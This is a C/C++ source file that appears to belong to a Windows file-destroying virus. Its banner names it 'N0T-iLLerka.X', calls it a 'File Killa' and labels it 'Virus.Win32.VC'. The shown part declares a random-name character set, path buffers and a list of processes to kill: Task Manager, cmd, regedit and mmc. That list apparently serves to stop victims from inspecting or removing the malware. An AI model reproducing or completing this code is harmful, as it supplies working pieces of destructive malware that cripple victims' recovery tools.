#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

const WCHAR szCharSet[] = {
	L"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	L"abcdefghijklmnopqrstuvwxyz"
	L"1234567890"
};
const SIZE_T clCharSet = (sizeof(szCharSet) - 2) / 2;

LPCWSTR szKillProcs[] = {
	L"taskmgr.exe",
	L"cmd.exe",
	L"regedit.exe",
	L"mmc.exe"
};
const SIZE_T clKillProcs = sizeof(szKillProcs) / sizeof(LPCWSTR);

WCHAR szCd[MAX_PATH];
WCHAR szMfn[MAX_PATH];

#if defined(_CONSOLE)
	// Ugly formating but necessary
	const WCHAR szN0TiLLerkaX[] = {
		L"/-------------------------------------------------------------------------------------------\\\n"
		L"|  ______  _________________     __ ___     ___    _______        __      ____    ____  ___ |\n"
		L"|  \\     \\ \\   _  \\__   ___/    |__|   |   |   |   \\____  \\______|  | __ / |  |   \\   \\/  / |\n"
		L"|  /   |  \\/  /_\\  \\|   | ______|  |   |   |   |     _(_  <_  __ \\  |/ //  |  |_   \\     /  |\n"
		L"| /    |   \\  \\_/   \\   |/_____/|  |   |___|   |___ /      \\  | \\/    </   ^   /   /     \\  |\n"
		L"| \\____|_  /\\_____  /___|       |__|______ \\______ /_____  /__|  |__|_ \\___   | /\\/___/\\  \\ |\n"
		L"|        \\/       \\/                      \\/      \\/     \\/           \\/   |__| \\/      \\_/ |\n"
		L"+--------------------------------------------------------------------+----------------------/\n"
		L"| N0T-iLLerka.X [.niX] your File Killa]    [Virus.Win32.VC Type: .X] |\n"
		L"| by Lima X [L4X] / [G-C-E-R] (C) 2kl9     [dev-VER: 0.5.2 BETA-1.0] |\n"
		L"\\--------------------------------------------------------------------/\n"
	};
#endif // _CONSOLE